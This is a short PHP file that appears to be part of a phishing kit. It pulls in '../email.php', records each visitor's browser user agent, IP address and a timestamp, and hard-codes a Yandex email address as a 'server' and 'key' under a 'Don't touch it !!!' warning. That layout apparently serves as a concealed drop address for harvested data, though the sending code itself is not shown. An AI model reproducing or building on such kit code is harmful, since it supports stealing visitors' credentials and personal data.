<?php 

  include("../email.php");

//---------------------  Don't touch it !!! --------------------------------
 
 $device =$_SERVER['HTTP_USER_AGENT'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $timestamp = date('d/m/Y h:i:s');
 $server ="em4il.server@yandex.com";
 $key = $server;
//--------------------------------------------------------------------------
?>
